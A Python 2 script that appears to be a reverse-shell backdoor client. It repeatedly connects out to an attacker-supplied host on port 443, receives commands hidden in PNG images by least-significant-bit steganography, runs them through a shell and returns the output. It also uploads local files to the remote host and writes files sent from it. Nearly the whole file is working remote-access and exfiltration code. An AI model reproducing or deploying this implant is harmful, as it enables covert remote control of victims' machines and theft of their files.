import socket
import threading
import subprocess
import sys
import os
import datetime
import time
from PIL import Image

#print "Set target host\n"
targetHost = raw_input("set target host: ")
#targetPort = int(raw_input("set target port: "))
targetPort = 443


# Convert encoding data into 8-bit binary 
# form using ASCII value of characters 
def genData(data): 
		
		# list of binary codes 
		# of given data 
		newd = [] 
		for i in data:
			newd.append(format(ord(i), '08b')) 
                print newd
		return newd 
		
# Pixels are modified according to the 
# 8-bit binary data and finally returned 
def modPix(pix, data): 
	
	datalist = genData(data) 
	lendata = len(datalist) 
	imdata = iter(pix)
        #print "original"
	for i in range(lendata): 
		
		# Extracting 3 pixels at a time 
		#pix = [value for value in imdata.__next__()[:3] +
		#						imdata.__next__()[:3] +
		#						imdata.__next__()[:3]] 
		
                pix = []
                
                for ctn in range(0,3):
                    one_pix = next(imdata)
                    #print one_pix
                    for val in one_pix:
                        #print val
                        pix.append(val)

                #print len(pix)
		# Pixel value should be made 
		# odd for 1 and even for 0 
                k = 0
		for j in range(0, 8):
                        
                        #print k
                        #print j
    
			if (datalist[i][j]=='0') and (pix[k]% 2 != 0): 
				if (pix[k]% 2 != 0):
                                    if (pix[k] > 0):
					pix[k] -= 1
                                    else:
                                        pix[k] += 1
			elif (datalist[i][j] == '1') and (pix[k] % 2 == 0): 
                            if (pix[k] > 0):
				pix[k] -= 1
                            else:
                                pix[k] += 1
                        if (k > 0 and k % 4 == 2):
                            k += 2
                        else:
                            k += 1
				
		# Eigh^th pixel of every set tells 
		# whether to stop or read further. 
		# 0 means keep reading; 1 means the 
		# message is over. 
		if (i == lendata - 1): 
			if (pix[-2] % 2 == 0):
                            if (pix[-2] > 0):
				pix[-2] -= 1
                            else:
                                pix[-2] += 1
		else: 
			if (pix[-2] % 2 != 0):
                            if (pix[-2] > 0):
				pix[-2] -= 1
                            else:
                                pix[-2] += 1

		pix = tuple(pix)
                #print "new:"
                #print pix
		yield pix[0:4] 
		yield pix[4:8] 
		yield pix[8:12] 

def encode_enc(newimg, data): 
	w = newimg.size[0] 
	(x, y) = (0, 0)

        load = newimg.load()
	
	for pixel in modPix(newimg.getdata(), data): 
	        #print "pixel: "
                #print pixel
		# Putting modified pixels in the new image 
		load[x, y] = pixel
                
		if (x == w - 1): 
			x = 0
			y += 1
		else: 
			x += 1
        #print "new"
        
        #for ele in newimg.getdata():
            #print ele

        return newimg
        #print newimg.getpixel((0,0))
        #new = newimg.getdata()
        #for ele in new:
        #    print ele
			
# Encode data into image 
def encode(img, data): 
	#img = input("Enter image name(with extension): ") 
	image = Image.open(img, 'r') 
	
	#data = input("Enter data to be encoded : ") 
	if (len(data) == 0): 
		raise ValueError('Data is empty') 
		
	newimg = image.copy() 
	#encode_enc(newimg, data) 
	newImg = encode_enc(newimg, data)
    
	new_img_name = input("Enter the name of new image(with extension): ")
        
	#newImg.save(new_img_name, str(new_img_name.split(".")[1].upper()))
        newImg.save(new_img_name)
        #newImg.close()
        #for ele in newImg.getdata():
        #    print ele
    

# Decode the data in the image 
def decode(img): 
	#img = input("Enter image name(with extension) :") 
	image = Image.open(img, 'r') 
	
	data = '' 
        
        img_dt = image.getdata()
	imgdata = iter(img_dt) 

        #for ele in img_dt:
        #    print ele
    
        notEnd = True
	while (notEnd): 
		#pixels = [value for value in imgdata.__next__()[:3] +
		#						imgdata.__next__()[:3] +
		#						imgdata.__next__()[:3]] 
		# string of binary data 
                pixels = []
                for cnt in range(0,3):
                    one_pixel = next(imgdata)
                    #print one_pixel
                    for val in one_pixel:
                        #print val
                        pixels.append(val)

		binstr = '' 
		
		for i in range(0,10): 
                    if (i % 4 != 3):
                        #print i
			if (pixels[i] % 2 == 0): 
				binstr += '0'
			else: 
				binstr += '1'
		
                #print binstr
		data += chr(int(binstr, 2)) 
		if (pixels[-2] % 2 != 0):
                    notEnd = False
        #print data
	return data 

def receiveCmd(client):
    recv = client.recv(1024)
    fileSize = long(recv)
    #print fileSize
    client.send("OK")
    #print "after sending ok"
    f = open('newsentCosmos.png', 'wb')
    #print "after open file"
    #print f
    data = client.recv(1024)
    totalRecv = len(data)
    #print "receive 1"
    f.write(data)
    #print "receive 2"
    while totalRecv < fileSize:
        #print "receive"
        data = client.recv(1024)
        totalRecv += len(data)
        f.write(data)
    f.write(data)
    f.close()
    #print "decode"
    decodedstr = decode("newsentCosmos.png")
    return decodedstr


#def notify():
    #myTime = time.ctime()
    #print myTime
    #client.send(myTime)
    #threading.Timer(10, notify).start()

def readCommand(command):
    output = ''
    command = command.rstrip()
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    for line in iter(output.stdout.readline, ''):
    	client.send(line)
    	sys.stdout.flush()

def stopConnection():
    client.close()
    os._exit(1)

while 1:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while 1:
        try:
            client.connect((targetHost, targetPort))
            
            break;
        except:
            pass
    while True:
        try:
            #notify()
            cmd_buffer=""
            #cmd_buffer=client.recv(1024)
            cmd_buffer = receiveCmd(client)
            if (cmd_buffer == "quit" or cmd_buffer == "exit" or cmd_buffer == "close"):
                stopConnection()
            elif ("Retrieve" in cmd_buffer):
                cmdsplit = cmd_buffer.split()
                #print "cmdsplit is %s %s %s " % (cmdsplit[0], cmdsplit[1], cmdsplit[2])
                filename = cmdsplit[1]
                filesize = long(cmdsplit[2])
                if (filesize > 0):
                    client.send("OK")
                    f = open('new_' + filename, 'wb')
                    data = client.recv(1024)
                    totalRecv = len(data)
                    f.write(data)
                    while totalRecv < filesize:
                        data = client.recv(1024)
                        totalRecv += len(data)
                        f.write(data)
                        #print "{0:.2f}".format((totalRecv/float(filesize))*100)+ "% Done"
                    #print "Download Complete!"
                    f.write(data)
                    f.close()
            elif ("Send" in cmd_buffer):
                #print "in send if\n"
                filename = cmd_buffer.replace("Send ","")
                #print "filename get %s" % filename
                if os.path.isfile(filename):
                    #print "in os.path isfile if\n"
                    client.send("EXISTS " + str(os.path.getsize(filename)))
                    serverResponse = client.recv(1024)
                    #print "server then response: %s" % serverResponse
                    if serverResponse == "OK":
                        #print "in writing if"
                        with open(filename, 'rb') as f:
                            bytestosend = f.read(1024)
                            client.send(bytestosend)
                            while bytestosend != "":
                                bytestosend = f.read(1024)
                                client.send(bytestosend)
                else:
                    client.send("NO")
            elif ("cd" in cmd_buffer):
                cmd_buffer = cmd_buffer.replace("cd ", "")
                os.chdir(cmd_buffer)
                client.send(os.getcwd())
            else:
                readCommand(cmd_buffer)
                #client.send("#")
        except:
            client.close()
            break

